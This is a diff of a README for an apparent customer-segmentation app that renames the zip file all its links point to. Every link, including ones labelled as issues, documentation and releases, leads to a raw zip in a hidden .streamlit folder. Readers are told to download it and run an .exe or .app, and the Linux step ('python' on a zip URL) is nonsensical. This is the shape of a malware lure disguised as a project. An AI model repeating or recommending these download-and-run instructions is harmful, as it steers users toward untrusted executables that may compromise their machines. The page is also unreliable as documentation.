@@ -23,12 +23,12 @@ To run this application effectively, make sure your system meets the following r
 Getting started with the Mall-Customer-Segmentation application is simple. Follow these steps to download and set it up on your computer.
 
 ## 🔗 Download Now
-[![Download Mall-Customer-Segmentation](https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Customer_Mall_Segmentation_2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Customer_Mall_Segmentation_2.5.zip)
+[![Download Mall-Customer-Segmentation](https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Segmentation-Mall-Customer-v2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Segmentation-Mall-Customer-v2.3.zip)
 
 ## 📝 Installation Steps
 1. **Visit the Releases Page:** Click the link below to go to the download page.
   
-   [Visit the releases page to download](https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Customer_Mall_Segmentation_2.5.zip)
+   [Visit the releases page to download](https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Segmentation-Mall-Customer-v2.3.zip)
 
 2. **Select the Latest Version:** Look for the latest version of the application. It is usually at the top of the releases list.
 
@@ -39,7 +39,7 @@ Getting started with the Mall-Customer-Segmentation application is simple. Follo
 5. **Run the Application:** 
    - For Windows: Double-click the `.exe` file. 
    - For macOS: Double-click the `.app` file.
-   - For Linux: Open a terminal, navigate to the folder containing the application, and run it with `python https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Customer_Mall_Segmentation_2.5.zip`.
+   - For Linux: Open a terminal, navigate to the folder containing the application, and run it with `python https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Segmentation-Mall-Customer-v2.3.zip`.
 
 6. **Follow On-Screen Instructions:** The program will guide you through the setup process. Simply follow the prompts to start analyzing your data.
 
@@ -71,7 +71,7 @@ For further assistance, please refer to the FAQs or contact support via the GitH
 The Mall-Customer-Segmentation application offers a simple way to explore and analyze your mall customer data. With just a few clicks, you can gain insights that can help your business grow. Download the software today and start uncovering valuable customer insights.
 
 ## 🔗 Additional Resources
-- [GitHub Issues](https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Customer_Mall_Segmentation_2.5.zip)
-- [Documentation](https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Customer_Mall_Segmentation_2.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Segmentation-Mall-Customer-v2.3.zip)
+- [Documentation](https://raw.githubusercontent.com/citywalker38/Mall-Customer-Segmentation/main/.streamlit/Segmentation-Mall-Customer-v2.3.zip)
 
 Happy analyzing!
